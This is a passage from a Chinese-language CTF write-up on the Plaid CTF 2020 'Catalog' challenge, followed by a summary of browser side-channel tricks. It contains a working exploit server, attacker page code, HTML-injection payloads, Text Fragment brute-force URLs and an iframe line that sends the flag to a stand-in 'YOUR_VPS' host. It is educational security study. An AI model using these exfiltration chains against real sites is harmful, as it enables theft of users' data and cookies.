      i
      t
      l
      e
也就是说，对于`$("em").lettering()`这段代码，题目已经提供了便利，当我们利用html代码注入插入``标签时，其内容会拆分为分块字符。这样也就可以配合Text
Fragments进行flag的匹配了
## 匹配技巧
### 判断匹配成功
有了上面的前置知识，这里还要组合起来利用，对于Text Fragments的匹配，我们如何判断是否选中成功呢？在官方exp中是这样判断：
  1. 首先我们知道同一session可以存储一定的html元素，在登录状态下，仍可以利用fetch no-cors来更新界面，从而登录失败在另一个有同一session的页面下进行html代码注入
  2. 注入足够多的``标签，从而使flag位于页面视图之外(需要拉动滚动条)，然后在``后利用``来加载图片并src请求来判断，并且这个图片是懒加载机制(位于用户浏览器视图内才会加载，否则不加载)
  3. 由于一开始图片位于视图外，所以图片不加载，如果利用Text Fragments匹配到flag，则由于多个``，页面先滚动到flag的位置，这时图片位于视图内，于是加载，设置`src = 'http://vps'`发送请求，通过自己的vps上是否接收到请求来判断是否匹配到flag
    图片未加载 -> 匹配到flag -> 发送请求
             -> 未匹配flag
关于图片的懒加载机制：[Lazily load iframes and images via ‘loading’
attribute](https://chromestatus.com/feature/5645767347798016)
>
> 只有当用户窗口页面内关注到``标签时，该标签才能加载对应的资源。我们可以使用``原生属性`loading=lazy`来实现，Chrome
> 76以后的版本都已实现了该功能
### 二分爆破
根据 flag 的格式`/^PCTF\{[A-Z0-9_]+\}$/`，我们可以构造如下URL(包括所有的可能字符)
    http://catalog.pwni.ng/issue.php?id=3#:~:text=T-,F,{,-}&text=T-,F,{,-0&text=T-,F,{,-1&text=T-,F,{,-2&text=T-,F,{,-3&text=T-,F,{,-4&text=T-,F,{,-5&text=T-,F,{,-6&text=T-,F,{,-7&text=T-,F,{,-8&text=T-,F,{,-9&text=T-,F,{,-A&text=T-,F,{,-B&text=T-,F,{,-D&text=T-,F,{,-E&text=T-,F,{,-F&text=T-,F,{,-G&text=T-,F,{,-H&text=T-,F,{,-I&text=T-,F,{,-J&text=T-,F,{,-K&text=T-,F,{,-L&text=T-,F,{,-M&text=T-,F,{,-N&text=T-,F,{,-O&text=T-,F,{,-P&text=T-,F,{,-Q&text=T-,F,{,-R&text=T-,F,{,-S&text=T-,F,{,-T&text=T-,F,{,-U&text=T-,F,{,-V&text=T-,F,{,-W&text=T-,F,{,-X&text=T-,F,{,-Y&text=T-,F,{,-Z&text=T-,F,{,-_
我们利用二分加快爆破速度，先将所有text情况分半，假设分成如下：
    http://catalog.pwni.ng/issue.php?id=3#:~:text=T-,F,{,-}&text=T-,F,{,-0&text=T-,F,{,-1&text=T-,F,{,-2&text=T-,F,{,-3&text=T-,F,{,-4&text=T-,F,{,-5&text=T-,F,{,-6&text=T-,F,{,-7&text=T-,F,{,-8&text=T-,F,{,-9&text=T-,F,{,-A&text=T-,F,{,-B&text=T-,F,{,-D&text=T-,F,{,-E&text=T-,F,{,-F&text=T-,F,{,-G&text=T-,F,{,-H
若匹配成功，则在该部分继续二分，若匹配失败，则用另一个范围二分，直到匹配只剩一个字符便是flag
## 复现 & exp
上面已经分析完这道题所需要的技术和知识了，现在只需将上述过程利用exp来实现，其实原理还是好理解，但是exp就有点糊:)
这里先给出exp:
  1. **exp.js**
在自己的vps上用node运行
    const express = require("express");
    const app = express();
    let status = false;
    let unlock = false;
    let match = false;
    app.get("/status", (req, res) => {
        res.send(`${status}`);
    });
    app.get("/unlock", (req, res) => {
        unlock = true;
        res.send("unlock");
    });
    app.get("/firstload", (req, res) => {
        console.log("==> Admin opened challenge's page");
        res.send("firstload");
    });
    app.get("/", (req, res) => {
        console.log("==> Admin was redirected to attacker's page");
        res.sendFile("index.html", {
            root: __dirname
        });
    });
    app.get("/injection", (req, res) => {
        console.log("==> HTML injection was inserted into id=3 catalog");
        setTimeout(() => {
            if (match) console.log("==> There was a match");
            else console.log("==> There wasn't a match");
            match = false;
            unlock = false;
            status = false;
        }, 1000);
        res.send("injection");
    });
    app.get("/exfiltrated", (req, res) => {
        match = true;
        res.send("exfiltrated");
    });
    app.get("/fragment", (req, res) => {
        status = true;
        console.log("==> Admin was fragmented");
        let timer = setInterval(async () => {
            if (unlock) {
                res.send("fragment");
                clearInterval(timer);
            }
        }, 1);
    });
    app.listen(port);
    console.log("Server running on port: " + port);
  1. **index.html**
根目录存放的index.html文件，当访问`http://your_vps/`时会加载
            exp
                const next = async () => {
                    let res  = await fetch("/status");
                    let status = await res.text();
                    if (status === "true") {
                        await fetch("http://catalog.pwni.ng/user.php", {
                            "headers": {
                                "content-type": "application/x-www-form-urlencoded",
                            },
                            "body": `username="/>&password=1&action=login`,
                            "method": "POST",
                            "mode": "no-cors",
                            "credentials": "include"
                        });
                        await fetch("/unlock");
                    } else {
                        next();
                    }
                }
                next();
然后我们分析一下exp和整个攻击链的工作流程：(前提注册账号等工作已经完成)
1. **创建issue1，抓包改post内容为**
    id=issue1&title=3&content=1&image=z"/>
这里利用的是img url处的注入，注入的内容利用meta跳转、Text Fragments来发送请求爆破flag
> **flag所在页面是`http://catalog.pwni.ng/issue.php?id=3`**
2. **创建issue2，抓包改内容为**
    id=issue_id_2&title=3&content=1&image=">"
issue2是攻击链的起点，提交给admin bot访问
3.vps上起服务：`node exp.js`
4.提交issue2所在页面(`http://catalog.pwni.ng/issue.php?id=3`)给admin访问，由于存在meta跳转，会跳转到vps上的index.html
5.index.html中的iframe会请求issue1所在页面，并通过AJAX发送请求给`http://your_vps/status`，由于exp.js中会返回`status`为false并完成`let
status = await res.text();`赋值，而页面存在`if (status ===
"true")`，因此将进入else分支，不断执行next()异步函数，也就不断从服务端获取status，只有当`status ===
"true"`时，才能进入if  
6. **当iframe加载完毕后** ，由于issue1中存在``，故请求`/fragment`路由
    app.get("/fragment", (req, res) => {
        status = true;
        console.log("==> Admin was fragmented");
        let timer = setInterval(async () => {
            if (unlock) {
                res.send("fragment");
                clearInterval(timer);
            }
        }, 1);
    });
其中设置了`status =
true;`，此时返回的status满足页面的if条件，因此`/fragement`路由的作用就是来解status锁，并且设置另一个fragment锁，该fragment锁由于`setInterval`重复事件会阻碍meta跳转，需等待unlock参数来接触。此时表示
**iframe已开始加载issue1的内容但还未进行meta跳转**
7.进入if后，并`fetch`请求`http://catalog.pwni.ng/user.php`，由于此时是admin身份的session，而username参数不是admin，发送请求导致登录失败，因此admin的session存储的html元素会变成登录失败的html元素，也就注入了`"/>...`这一部分内容进入admin的session中
8.下一步执行`await fetch("/unlock");`，明显这个路由是解fragment锁的，此时表示
**issue1页面全部加载且可以meta跳转到包含flag和text fragments功能的界面**
9.meta跳转用的是admin session，而第7步已经将admin
session变为注入的内容。从这里我们可以知道fragment锁的作用就是等待admin
session注入后由meta跳转携带注入内容到flag所在页面。一加载完flag所在页面后，先会``请求injection路由：
    app.get("/injection", (req, res) => {
        console.log("==> HTML injection was inserted into id=3 catalog");
        setTimeout(() => {
            if (match) console.log("==> There was a match");
            else console.log("==> There wasn't a match");
            match = false;
            unlock = false;
            status = false;
        }, 1000);
        res.send("injection");
    });
此时设置`1000`即1s的延迟，为了等待Text Fragments来匹配flag
10.由于注入足够多的``标签，会将flag挤出视窗外，并且uBlock维持了User Activation从而可激发Text
Fragments功能，进行flag匹配，如果匹配到flag，就会触发滚动，由于图片懒加载机制，此时才会请求`/exfiltrated`路由
    app.get("/exfiltrated", (req, res) => {
        match = true;
        res.send("exfiltrated");
    });
设置了match为true，因此在injection路由中会输出`==> There was a match`判断回显，否则，match默认为false
这整个流程完成一次只能完成一次二分，因此工作量还是蛮大的，如果flag的位数很长的话，要重复上述流程很多次。所以这道题的复现难度还是很大的，但是原理理解清楚的话也基本上完成了学习的目的了。
**参考**
[Plaid CTF 2020 Catalog](http://blog.zeddyu.info/2020/04/24/Plaid-CTF-2020-Web-2/)
[官方wp](https://dttw.tech/posts/B19RXWzYL)
# 总结
## 思考点
通过四道题学习侧信道，发现国外ctf(除noxss)的题目很喜欢出一些跟xss和前端有关的题目，涉及的技术有点偏前端、侧信道以及浏览器的一些新特性，而且攻击链的构造比较复杂。稍微总结一下有关侧信道题目的思考点：
  1. **如何外带flag或盲注flag并完成判断回显。**
通常需要借助一些匹配特性( **上文的XSS Auditor、连字、Text Fragments**
)来盲注flag，对于回显判断，则需要有回显信息到自己的vps中( **日志或用于判断的Nodejs服务**
)，而信息的来源则需要在匹配到flag时发送请求( **iframe的二次onload、连字的滚动条、滚动条+图片懒加载** )
  1. **如何获取可以利用的特性**
这个就比较玄学了，可能大部分师傅不是因为能力原因，而是因为特性难找而没做出来，仅根据上文特性的出处稍微总结一下
  * [chrome各版本特性](https://chromestatus.com/features)
  * [PortSwigger](https://portswigger.net/daily-swig)：研究web前端安全比较多的一个站点
## 浏览器对外发送请求的方法
要想外带数据，基本需要以admin的身份通过浏览器对外发送数据从而获取flag
1.``的`iframe.src`配合`iframe.onload`
35C3 CTF filemanager这道题的方法，改变iframe.src触发iframe.onload请求src所指向的url
    iframe.onload = () => {}; //发送请求外带数据
    iframe.src = 'http://YOUR_VPS:PORT/?flag=' + encodeURIComponent(real_flag); # 外带数据
2.iframe框架载入资源 + CSS设置`-webkit-scrollbar`滚动条触发请求
3.用户视窗外的 **图片懒加载机制** 发送请求
``本身就可发送请求，只不过结合了图片的懒加载机制配合爆破flag
4.``
http-equiv属性会在发送给浏览器的http请求头中添加名值对(http-equiv/content)字段信息，上述语句的作用是刷新文档后0秒请求URL内的资源。
5.`window.location.href` ==`document.location.href` == `location.href`
最基本的窃取cookie的方式